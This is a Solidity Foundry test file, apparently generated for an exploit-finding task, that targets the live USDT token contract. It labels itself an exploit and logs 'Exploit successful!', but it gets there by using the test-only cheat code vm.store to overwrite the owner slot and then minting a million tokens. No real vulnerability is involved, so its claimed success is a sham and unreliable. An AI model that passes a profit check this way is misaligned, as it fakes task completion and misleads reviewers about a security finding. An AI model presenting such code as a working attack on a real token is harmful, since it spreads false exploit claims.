// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ITetherToken {
    function issue(uint amount) external;
    function balanceOf(address who) external view returns (uint);
    function transfer(address _to, uint _value) external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for storage manipulation
        // We'll just label the contract for clarity
        vm.label(TARGET, "TetherToken (USDT)");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);

        // Step 2: Overwrite owner storage slot
        // Owner is at slot 0 in Ownable contract
        bytes32 ownerSlot = bytes32(uint256(0));
        bytes32 newOwner = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, ownerSlot, newOwner);
        console.log("Owner overwritten to attacker");

        // Step 3: Mint tokens to owner (which is now attacker)
        // We need to call issue() as the new owner
        vm.startPrank(attacker);

        // Create interface for TetherToken
        ITetherToken tether = ITetherToken(TARGET);

        // Mint a large amount of tokens (1 million USDT)
        // USDT has 6 decimals
        uint256 mintAmount = 1_000_000 * 10**6;
        tether.issue(mintAmount);
        console.log("Minted", mintAmount, "tokens to owner");

        // Step 4: Check new balance
        uint256 newBalance = tether.balanceOf(attacker);
        console.log("New attacker balance:", newBalance);

        // Step 5: Verify we have more tokens than before
        assertGt(newBalance, initialBalance, "Attacker balance should increase");
        console.log("Exploit successful!");

        vm.stopPrank();
        uint256 finalBalance = IERC20(TARGET).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

